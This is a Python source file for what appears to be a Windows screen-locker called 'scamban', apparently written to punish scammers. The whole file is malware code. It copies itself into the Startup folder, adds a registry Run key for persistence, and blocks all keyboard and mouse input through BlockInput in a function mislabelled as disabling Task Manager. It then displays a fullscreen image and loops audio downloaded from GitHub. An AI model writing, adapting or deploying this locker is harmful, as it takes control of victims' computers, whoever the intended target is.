import tkinter as tk
from PIL import Image, ImageTk
import pygame
import requests
from io import BytesIO
import ctypes
import time
import os
import sys
import shutil
import winreg as reg

# URLs for the image and songs on GitHub
IMAGE_URL = "https://github.com/Abdhd-and-tbvr/Scammer-ChatGPT-Ender/raw/main/Untitled.jpg"
SONG1_URL = "https://github.com/Abdhd-and-tbvr/Scammer-ChatGPT-Ender/raw/refs/heads/main/Daisy%20Bell.mp3"
SONG2_URL = "https://github.com/Abdhd-and-tbvr/Scammer-ChatGPT-Ender/raw/refs/heads/main/You%20Never%20Know%20I'm%20There%20(Lyric%20Video)%20%20One%20TPOT%20Fan%20Made%20Recap%20Song.mp3"

# Initialize pygame for audio
pygame.mixer.init()

# Path for startup folder
STARTUP_FOLDER = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
EXECUTABLE_NAME = "scamban.exe"  # Name the executable appropriately


# Copy the .exe to startup folder
def copy_to_startup():
    exe_path = sys.executable  # Path of the running executable
    startup_path = os.path.join(STARTUP_FOLDER, EXECUTABLE_NAME)

    # Check if already in startup folder
    if exe_path != startup_path:
        shutil.copyfile(exe_path, startup_path)

    # Add to Windows Registry to ensure startup
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE) as reg_key:
        reg.SetValueEx(reg_key, "scamban", 0, reg.REG_SZ, startup_path)


# Call function to copy the program to startup
copy_to_startup()


# Function to disable user input (locking keyboard and mouse)
def disable_task_manager():
    ctypes.windll.user32.BlockInput(True)  # Block all input


# Enable Task Manager (in case of debugging)
def enable_task_manager():
    ctypes.windll.user32.BlockInput(False)  # Allow input again


# Initialize the main window
root = tk.Tk()
root.attributes("-fullscreen", True)  # Set full-screen
root.configure(background='black')

# Fetch and load the image from GitHub
response = requests.get(IMAGE_URL)
image_data = BytesIO(response.content)
image = Image.open(image_data)
img = ImageTk.PhotoImage(image)
label = tk.Label(root, image=img, bg='black')
label.place(relx=0.5, rely=0.5, anchor="center")


# Download and play songs
def download_and_play_song(url):
    response = requests.get(url)
    song_data = BytesIO(response.content)
    pygame.mixer.music.load(song_data)
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():  # Wait for song to finish
        time.sleep(1)


# Lock the user's input
disable_task_manager()

# Start playing the first song, then play the second on loop
download_and_play_song(SONG1_URL)
pygame.mixer.music.load(BytesIO(requests.get(SONG2_URL).content))
pygame.mixer.music.play(-1)  # -1 means loop indefinitely


# Define an event to close the program (for debugging, you can remove this later)
def close_app(event):
    pygame.mixer.music.stop()  # Stop the music
    enable_task_manager()  # Re-enable input
    root.destroy()


root.bind("<Escape>", close_app)  # Pressing "Escape" will close the app

# Run the main application loop
root.mainloop()
